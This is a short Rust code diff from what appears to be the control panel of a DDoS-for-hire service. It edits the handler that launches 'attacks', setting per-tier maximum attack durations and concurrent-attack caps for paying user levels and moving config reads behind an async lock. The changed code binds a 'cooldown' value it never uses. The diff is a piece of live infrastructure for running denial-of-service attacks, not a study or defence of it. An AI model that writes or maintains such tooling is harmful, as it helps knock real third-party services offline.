@@ -39,19 +39,20 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
     };
 
     // Determine limits based on level
-    let (max_time, concurrents) = match client.user.get_level() {
-        Level::Owner => (state.config.max_attack_duration_secs * 2, 10),
-        Level::Admin => (state.config.max_attack_duration_secs, 5),
-        Level::Pro => (state.config.max_attack_duration_secs, 3),
-        Level::Basic => (state.config.max_attack_duration_secs / 2, 1),
+    let (max_duration, cooldown) = match client.user.get_level() {
+        Level::Owner => (state.config.read().await.max_attack_duration_secs * 2, 10),
+        Level::Admin => (state.config.read().await.max_attack_duration_secs, 5),
+        Level::Pro => (state.config.read().await.max_attack_duration_secs, 3),
+        Level::Basic => (state.config.read().await.max_attack_duration_secs / 2, 1),
     };
 
-    if duration > max_time {
-        client.write(format!("\x1b[38;5;196m[X] Invalid duration (Max: {}s)\n\r", max_time).as_bytes()).await?;
+    if duration > max_duration {
+        client.write(format!("\x1b[38;5;196m[X] Invalid duration (Max: {}s)\n\r", max_duration).as_bytes()).await?;
         return Ok(());
     }
 
     // Check concurrent attacks limit
+    let concurrents = state.config.read().await.max_attacks;
     let active_attacks = state.attack_manager.get_user_attacks(&client.user.username).await.len();
     if active_attacks >= concurrents {
         client.write(format!("\x1b[38;5;196m[X] Max concurrent attacks reached ({}/{})\n\r", active_attacks, concurrents).as_bytes()).await?;
